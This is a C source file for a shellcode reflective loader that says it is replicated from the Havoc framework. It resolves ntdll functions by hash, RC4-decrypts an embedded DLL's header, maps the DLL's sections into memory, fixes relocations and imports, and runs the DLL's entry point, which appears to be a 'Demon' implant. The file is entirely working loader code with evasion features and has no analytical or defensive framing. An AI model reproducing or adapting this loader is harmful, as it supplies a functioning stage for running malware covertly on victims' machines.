/**
 * Entry.c - Replicated from Havoc Shellcode
 */

#include <Core.h>
#include <Win32.h>

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

SEC( text, B ) VOID Entry( LPVOID pDllBase )
{
    INSTANCE                Instance        = { 0 };
    HMODULE                 KaynLibraryLdr  = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID volatile         KVirtualMemory  = NULL;
    SIZE_T                  KMemSize        = 0;
    DWORD                   KHdrSize        = 0;
    PVOID                   SecMemory       = NULL;
    SIZE_T                  SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
    KAYN_ARGS               KaynArgs        = { 0 };

    Instance.Modules.Ntdll  = LdrModulePeb( NTDLL_HASH );

    Instance.Win32.LdrLoadDll              = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.NtAllocateVirtualMemory = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
    Instance.Win32.NtFreeVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );

    KaynLibraryLdr = (HMODULE)DecryptDllBase( &Instance, pDllBase );

    NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
    KHdrSize  = SecHeader[ 0 ].VirtualAddress;
    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;

    if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        // TODO: find the base address of this shellcode in a better way?
        KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
        KaynArgs.DllCopy   = KaynLibraryLdr;
        KaynArgs.Demon     = KVirtualMemory;
        KaynArgs.DemonSize = KMemSize;

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            MemCopy(
                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
                C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
                SecHeader[ i ].SizeOfRawData                                        // Section Size
            );
        }

        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( KVirtualMemory, C_PTR( NtHeaders->OptionalHeader.ImageBase ), C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );

        KaynLdrImport( &Instance, KVirtualMemory, NtHeaders, KHdrSize );

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            {
                Protection = PAGE_EXECUTE_READ;
                KaynArgs.TxtBase = KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize;
                KaynArgs.TxtSize = SecHeader[ i ].SizeOfRawData;
            }

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;

            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
        }

        // --------------------------------
        // 6. Finally executing our DllMain
        // --------------------------------
        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
    }
}

SEC( text, C ) VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}

SEC( text, D ) VOID Rc4( PBYTE Data, DWORD DataLen, PBYTE Key, DWORD KeyLen )
{
      BYTE S[256];
      BYTE tmp;
      DWORD i, j = 0;

      for (i = 0; i < 256; i++)
          S[i] = (BYTE)i;

      for (i = 0; i < 256; i++) {
          j = (j + S[i] + Key[i % KeyLen]) & 0xFF;
          tmp = S[i]; S[i] = S[j]; S[j] = tmp;
      }

      i = j = 0;
      for (DWORD k = 0; k < DataLen; k++) {
          i = (i + 1) & 0xFF;
          j = (j + S[i]) & 0xFF;
          tmp = S[i]; S[i] = S[j]; S[j] = tmp;
          Data[k] ^= S[(S[i] + S[j]) & 0xFF];
      }
}

SEC( text, E ) LPVOID DecryptDllBase( PINSTANCE pInstance, LPVOID pDllBase )
{
    PBYTE                   Original        = (PBYTE)pDllBase;
    BYTE                    Rc4Key[4]       = { 0 };
    PVOID                   TempBuffer      = NULL;
    PVOID                   FullBuffer      = NULL;
    SIZE_T                  TempSize        = 1024;
    SIZE_T                  FileSize        = 0;
    SIZE_T                  ImageSize        = 0;
    SIZE_T                  ZeroSize        = 0;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_DOS_HEADER       DosHeader       = NULL;

    // 1. Extract RC4 key from first 4 bytes
    MemCopy( Rc4Key, Original, 4 );

    // 2. Allocate temporary buffer for decrypting header (1024 bytes)
    if ( !NT_SUCCESS( pInstance->Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &TempBuffer, 0, &TempSize, MEM_COMMIT, PAGE_READWRITE ) ) )
        return NULL;

    // 3. Copy and decrypt the first 1024 bytes
    MemCopy( TempBuffer, Original, 1024 );
    Rc4( (PBYTE)TempBuffer + 4, 1020, Rc4Key, 4 );

    // 4. Restore MZ signature
    ((PBYTE)TempBuffer)[0] = 'M';
    ((PBYTE)TempBuffer)[1] = 'Z';
    ((PBYTE)TempBuffer)[2] = 0x90;
    ((PBYTE)TempBuffer)[3] = 0x00;

    // 5. Read PE headers to get full image size
    DosHeader = (PIMAGE_DOS_HEADER)TempBuffer;
    NtHeaders = (PIMAGE_NT_HEADERS)( (PBYTE)TempBuffer + DosHeader->e_lfanew );

    PIMAGE_SECTION_HEADER SecHeader = IMAGE_FIRST_SECTION(NtHeaders);

    for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
        DWORD SectionEnd = SecHeader[i].PointerToRawData + SecHeader[i].SizeOfRawData;
        if (SectionEnd > FileSize) {
            FileSize = SectionEnd;
        }
    }

    if (FileSize < 1024) {
        FileSize = 1024;
    }

    ImageSize = FileSize;

    // 6. Allocate full buffer for complete decrypted DLL
    if ( !NT_SUCCESS( pInstance->Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &FullBuffer, 0, &ImageSize, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        pInstance->Win32.NtFreeVirtualMemory( NtCurrentProcess(), &TempBuffer, &ZeroSize, MEM_RELEASE );
        return NULL;
    }

    // 7. Copy decrypted header to full buffer
    MemCopy( FullBuffer, TempBuffer, 1024 );

    // 8. Free temporary buffer
    pInstance->Win32.NtFreeVirtualMemory( NtCurrentProcess(), &TempBuffer, &ZeroSize, MEM_RELEASE );

    // 9. copy remaining data (if size > 1024)
    if ( FileSize > 1024 )
    {
        MemCopy( (PBYTE)FullBuffer + 1024, Original + 1024, FileSize - 1024);
        //Rc4( (PBYTE)FullBuffer + 1024, FullSize - 1024, Rc4Key, 4 );
    }

    // 10. Return the fully decrypted DLL base address
    return FullBuffer;
}
